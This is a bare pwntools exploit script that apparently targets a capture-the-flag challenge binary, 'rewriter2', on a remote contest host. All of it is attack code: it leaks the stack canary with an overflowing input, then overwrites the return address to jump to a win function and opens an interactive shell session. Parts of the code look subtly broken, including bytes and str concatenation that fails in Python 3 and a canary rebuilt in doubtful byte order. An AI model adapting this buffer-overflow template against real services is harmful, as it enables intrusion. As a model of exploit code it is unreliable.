from pwn import *
elf_file = FILENAME = './rewriter2'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


'''
HOST = 'bofsec.2023.ricercactf.com'
POST = 9001
#libc = ELF("./libc.so.6")
'''
HOST = 'rewriter2.beginners.seccon.games'
POST = 9001
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b main''')

win = 0x4012c2
c.send(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXB')
c.recvuntil(b'XB')
canary_leak = c.recvline()[:7]+'\x00'
print(len(canary_leak))
canary = u64(canary_leak)
print(hex(canary))
c.send(b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\x00'+p64(canary)+'\x00\x00\x00\x00\x00\x00\x00'+p64(win+5))
c.interactive()